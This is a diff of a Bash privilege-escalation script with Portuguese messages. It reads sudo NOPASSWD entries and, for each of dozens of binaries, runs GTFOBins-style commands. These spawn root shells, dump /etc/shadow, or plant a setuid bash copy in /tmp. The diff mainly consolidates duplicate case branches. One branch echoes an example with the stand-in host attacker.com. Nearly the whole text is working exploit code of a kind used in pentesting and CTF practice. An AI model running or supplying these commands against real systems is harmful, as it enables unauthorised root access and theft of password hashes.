@@ -31,7 +31,7 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" a -ttar -an -so /etc/shadow | "$paths" e -ttar -si -so
             ;;
-        aa-exec)
+        aa-exec|aoss|distcc|env|ionice|multitime|nice|nsenter|pexec|pkexec|rlwrap|softlimit|sshpass|sudo|time|torify|torsocks|unshare|valgrind)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" /bin/sh
             ;;
@@ -55,19 +55,11 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" shell
             ;;
-        aoss)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
-            ;;
         apache2ctl)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -c "Include /etc/shadow" -k stop
             ;;
-        apt-get)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas possiveis):"
-            sudo "$paths" update -o APT::Update::Pre-Invoke::=/bin/sh
-            ;;
-        apt)
+        apt-get|apt)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas possiveis):"
             sudo "$paths" update -o APT::Update::Pre-Invoke::=/bin/sh
             ;;
@@ -100,7 +92,7 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -v -f /etc/shadow
             ;;
-        as)
+        as|nm)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             LFILE=/etc/shadow
             sudo "$paths" @$LFILE
@@ -109,15 +101,15 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -ns /etc/shadow
             ;;
-        ascii85)
+        ascii85|base32|base58|base64|basez)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" /etc/shadow | "$paths" --decode
             ;;
-        ash)
+        ash|bash|csh|dash|elvish|fish|ksh|posh|pwsh|sash|screen|su|tmux|vipw|yash|zsh)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths"
             ;;
-        aspell)
+        aspell|mosquitto)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -c /etc/shadow
             ;;
@@ -129,38 +121,18 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" /etc/shadow 2>&1 | awk -F "'" '{printf "%s", $2}'
             ;;
-        awk)
+        awk|gawk|mawk|nawk)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" 'BEGIN {system("/bin/sh")}'
             ;;
-        aws)
+        aws|bundle|bundler|gcloud)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" help
             !/bin/sh
             ;;
-        base32)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow | "$paths" --decode
-            ;;
-        base58)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow | "$paths" --decode
-            ;;
-        base64)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow | "$paths" --decode
-            ;;
         basenc)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" --base64 /etc/shadow | "$paths" -d --base64
-            ;;
-        basez)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow | "$paths" --decode
-            ;;
-        bash)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
             ;;
         batcat)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -185,16 +157,6 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -b /etc/shadow
             ;;
-        bundle)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" help
-            !/bin/sh
-            ;;
-        bundler)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" help
-            !/bin/sh
-            ;;
         busctl)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
@@ -214,11 +176,7 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -c /etc/shadow | "$paths" -d
             ;;
-        c89)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -wrapper /bin/sh,-s .
-            ;;
-        c99)
+        c89|c99|gcc)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -wrapper /bin/sh,-s .
             ;;
@@ -230,7 +188,7 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" --
             ;;
-        cat)
+        cat|check_statusfile|column|eqn|expand|hd|links|paste|pr|redcarpet|soelim|strings|tbl|troff|ul|uniq|xmore|zsoelim)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" /etc/shadow
             ;;
@@ -247,7 +205,7 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
             ;;
-        check_cups)
+        check_cups|check_memory|check_raid)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             LFILE=/etc/shadow
             sudo "$paths" --extra-opts=@$LFILE
@@ -257,16 +215,6 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo "LFILE=file_to_write"
             echo "INPUT=input_file"
             echo "sudo check_log -F $INPUT -O $LFILE"
-            ;;
-        check_memory)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            LFILE=/etc/shadow
-            sudo "$paths" --extra-opts=@$LFILE
-            ;;
-        check_raid)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            LFILE=/etc/shadow
-            sudo "$paths" --extra-opts=@$LFILE
             ;;
         check_ssl_cert)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -278,10 +226,6 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             umask 022
             "$paths" --curl-bin $TF -H example.net
             cat $out
-            ;;
-        check_statusfile)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
             ;;
         chmod)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -318,10 +262,6 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
             sudo "$paths" -xFj --frelax-syntax-checks $TF/x
             ;;
-        column)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
         comm)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" /etc/shadow /dev/null 2>/dev/null
@@ -332,13 +272,7 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
             sudo "$paths" --working-dir=$TF run-script x
             ;;
-        cowsay)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            TF=$(mktemp)
-            echo 'exec "/bin/sh";' >$TF
-            sudo "$paths" -f $TF x
-            ;;
-        cowthink)
+        cowsay|cowthink)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             TF=$(mktemp)
             echo 'exec "/bin/sh";' >$TF
@@ -372,10 +306,6 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -e
             ;;
-        csh)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            ;;
         csplit)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" /etc/shadow 1
@@ -399,11 +329,7 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -d "" -f1 /etc/shadow
             ;;
-        dash)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            ;;
-        date)
+        date|dig|file|fping|nft|ssh-keyscan|xpad)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -f /etc/shadow
             ;;
@@ -428,14 +354,6 @@ echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
         diff)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" --line-format=%L /dev/null /etc/shadow
-            ;;
-        dig)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -f /etc/shadow
-            ;;
-        distcc)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
             ;;
         dmesg)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -505,7 +423,7 @@ EOF
             sudo "$paths" logs
             !/bin/sh
             ;;
-        ed)
+        ed|ex|ftp|ginsh|iftop|journalctl|ncftp|psftp|tasksh)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths"
             !/bin/sh
@@ -513,10 +431,6 @@ EOF
         efax)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -d /etc/shadow
-            ;;
-        elvish)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
             ;;
         emacs)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -526,32 +440,15 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" /dev/null -qo /dev/null -I '/bin/sh >&2'
             ;;
-        env)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
-            ;;
-        eqn)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
         espeak)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -qXf /etc/shadow
-            ;;
-        ex)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            !/bin/sh
             ;;
         exiftool)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             echo "LFILE=file_to_write"
             echo "INPUT=input_file"
             echo "sudo exiftool -filename=$LFILE $INPUT"
-            ;;
-        expand)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
             ;;
         expect)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -563,17 +460,9 @@ EOF
             echo 'exec("/bin/sh")' > $TF/x.rb
             sudo FACTERLIB=$TF "$paths"
             ;;
-        file)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -f /etc/shadow
-            ;;
         find)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" . -exec /bin/sh \; -quit
-            ;;
-        fish)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
             ;;
         flock)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -586,28 +475,6 @@ EOF
         fold)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -w99999999 /etc/shadow
-            ;;
-        fping)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -f /etc/shadow
-            ;;
-        ftp)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            !/bin/sh
-            ;;
-        gawk)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" 'BEGIN {system("/bin/sh")}'
-            ;;
-        gcc)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -wrapper /bin/sh,-s .
-            ;;
-        gcloud)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" help
-            !/bin/sh
             ;;
         gcore)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
@@ -622,7 +489,7 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" open -e "/bin/sh -c /bin/sh" rdoc
             ;;
-        genie)
+        genie|rc)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -c '/bin/sh'
             ;;
@@ -643,11 +510,6 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("sh")'
             ;;
-        ginsh)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            !/bin/sh
-            ;;
         git)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Temos diversas tecnicas. Testando:"
             sudo PAGER='sh -c "exec sh 0<&1"' "$paths" -p help
@@ -656,7 +518,7 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" --pty /bin/sh
             ;;
-        grep)
+        grep|look)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" '' /etc/shadow
             ;;
@@ -672,15 +534,11 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -f /etc/shadow -t
             ;;
-        hd)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
-        head)
+        head|tail)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -c1G /etc/shadow
             ;;
-        hexdump)
+        hexdump|tic)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -C /etc/shadow
             ;;
@@ -697,21 +555,12 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -f 8859_1 -t 8859_1 /etc/shadow
             ;;
-        iftop)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            !/bin/sh
-            ;;
         install)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             cp /bin/bash /tmp/bsuid
             sudo "$paths" -m 6777 /tmp/bsuid /tmp/rsh
             /tmp/rsh -p
             rm -f /tmp/bsuid
-            ;;
-        ionice)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
             ;;
         ip)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
@@ -740,11 +589,6 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -a 2 /dev/null /etc/shadow
             ;;
-        journalctl)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            !/bin/sh
-            ;;
         jq)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -Rr . /etc/shadow
@@ -766,10 +610,6 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" exec -E 'exec "/bin/sh"'
             ;;
-        ksh)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            ;;
         ksshell)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -i /etc/shadow
@@ -783,11 +623,11 @@ EOF
             echo "LFILE=dir_to_serve"
             echo "sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
             ;;
-        latex)
+        latex|pdflatex)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
             sudo "$paths" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
             ;;
-        latexmk)
+        latexmk|perl)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -e 'exec "/bin/sh";'
             ;;
@@ -802,7 +642,7 @@ EOF
             echo "# move malicious libraries in $TF"
             echo "sudo ldconfig -f "$TF/conf""
             ;;
-        less)
+        less|pg)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" /etc/profile
             !/bin/sh
@@ -810,10 +650,6 @@ EOF
         lftp)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -c '!/bin/sh'
-            ;;
-        links)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
             ;;
         ln)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -828,10 +664,6 @@ EOF
         logsave)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" /dev/null /bin/sh -i
-            ;;
-        look)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" '' /etc/shadow
             ;;
         ltrace)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -874,10 +706,6 @@ EOF
             sudo "$paths" man
             !/bin/sh
             ;;
-        mawk)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" 'BEGIN {system("/bin/sh")}'
-            ;;
         minicom)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
             echo "sudo minicom -D /dev/null"
@@ -891,10 +719,6 @@ EOF
             TERM= sudo "$paths" /etc/profile
             !/bin/sh
             ;;
-        mosquitto)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -c /etc/shadow
-            ;;
         mount)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -o bind /bin/sh /bin/mount
@@ -906,15 +730,7 @@ EOF
             echo "irb"
             echo "system("/bin/sh")"
             ;;
-        msgattrib)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -P /etc/shadow
-            ;;
-        msgcat)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -P /etc/shadow
-            ;;
-        msgconv)
+        msgattrib|msgcat|msgconv|msguniq)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -P /etc/shadow
             ;;
@@ -926,17 +742,9 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -P /etc/shadow /dev/null
             ;;
-        msguniq)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -P /etc/shadow
-            ;;
         mtr)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" --raw -F /etc/shadow
-            ;;
-        multitime)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
             ;;
         mv)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
@@ -949,7 +757,7 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -e '\! /bin/sh'
             ;;
-        nano)
+        nano|pico)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths"
             ^R^X
@@ -958,10 +766,6 @@ EOF
         nasm)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -@ /etc/shadow
-            ;;
-        nawk)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" 'BEGIN {system("/bin/sh")}'
             ;;
         nc)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
@@ -974,33 +778,15 @@ EOF
             sudo "$paths"
             b
             ;;
-        ncftp)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            !/bin/sh
-            ;;
         neofetch)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             TF=$(mktemp)
             echo 'exec /bin/sh' >$TF
             sudo "$paths" --config $TF
             ;;
-        nft)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -f /etc/shadow
-            ;;
-        nice)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
-            ;;
         nl)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -bn -w1 -s '' /etc/shadow
-            ;;
-        nm)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            LFILE=/etc/shadow
-            sudo "$paths" @$LFILE
             ;;
         nmap)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
@@ -1029,10 +815,6 @@ EOF
             echo '/bin/sh' >> $TF/groff
             chmod +x $TF/groff
             sudo GROFF_BIN_PATH=$TF "$paths"
-            ;;
-        nsenter)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
             ;;
         ntpdate)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1079,10 +861,6 @@ EOF
             echo 'os.execute("/bin/sh")' >$TF
             sudo "$paths" -L $TF /dev/null
             ;;
-        paste)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
         pdb)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             TF=$(mktemp)
@@ -1090,11 +868,7 @@ EOF
             sudo "$paths" $TF
             cont
             ;;
-        pdflatex)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
-            sudo "$paths" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
-            ;;
-        pdftex)
+        pdftex|tex|xetex)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" --shell-escape '\write18{/bin/sh}\end'
             ;;
@@ -1102,22 +876,9 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" stat /bin/sh
             ;;
-        perl)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -e 'exec "/bin/sh";'
-            ;;
         perlbug)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -s 'x x x' -r x -c x -e 'exec /bin/sh;'
-            ;;
-        pexec)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
-            ;;
-        pg)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/profile
-            !/bin/sh
             ;;
         php)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1130,12 +891,6 @@ EOF
             .PS
             sh X sh X
             ;;
-        pico)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            ^R^X
-            reset; sh 1>&0 2>&0
-            ;;
         pidstat)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             cmd=id
@@ -1147,10 +902,6 @@ EOF
             echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
             sudo "$paths" install $TF
             ;;
-        pkexec)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
-            ;;
         pkg)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             TF=$(mktemp -d)
@@ -1158,23 +909,10 @@ EOF
             fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
             sudo "$paths" install -y --no-repo-update ./x-1.0.txz
             ;;
-        posh)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            ;;
-        pr)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
         pry)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             echo "sudo "$paths""
             echo "system("/bin/sh")"
-            ;;
-        psftp)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            !/bin/sh
             ;;
         psql)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1190,21 +928,13 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
             ;;
-        pwsh)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            ;;
-        python | python3)
+        python|python3)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -c 'import os; os.system("/bin/sh")'
             ;;
         rake)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -p '`/bin/sh 1>&0`'
-            ;;
-        rc)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -c '/bin/sh'
             ;;
         readelf)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1220,10 +950,6 @@ EOF
             echo "w"
             echo "q"
             ;;
-        redcarpet)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
         restic)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
             echo "RHOST=attacker.com"
@@ -1236,25 +962,17 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" /etc/shadow | "$paths"
             ;;
-        rlwrap)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
-            ;;
         rpm)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
             sudo "$paths" -eval '%{lua:os.execute("/bin/sh")}'
             ;;
-        rpmdb)
+        rpmdb|rpmverify)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" --eval '%(/bin/sh 1>&2)'
             ;;
         rpmquery)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" --eval '%{lua:posix.exec("/bin/sh")}'
-            ;;
-        rpmverify)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" --eval '%(/bin/sh 1>&2)'
             ;;
         rsync)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1279,19 +997,10 @@ EOF
             echo '! exec /bin/sh' >$TF
             sudo "$paths" $TF
             ;;
-        rview)
+        rview|rvim)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
             sudo "$paths" -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
             echo "sudo "$paths" -c ':lua os.execute("reset; exec sh")'"
-            ;;
-        rvim)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
-            sudo "$paths" -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
-            echo "sudo "$paths" -c ':lua os.execute("reset; exec sh")'"
-            ;;
-        sash)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
             ;;
         scanmem)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1304,10 +1013,6 @@ EOF
             echo 'sh 0<&2 1>&2' > $TF
             chmod +x "$TF"
             sudo "$paths" -S $TF x y:
-            ;;
-        screen)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
             ;;
         script)
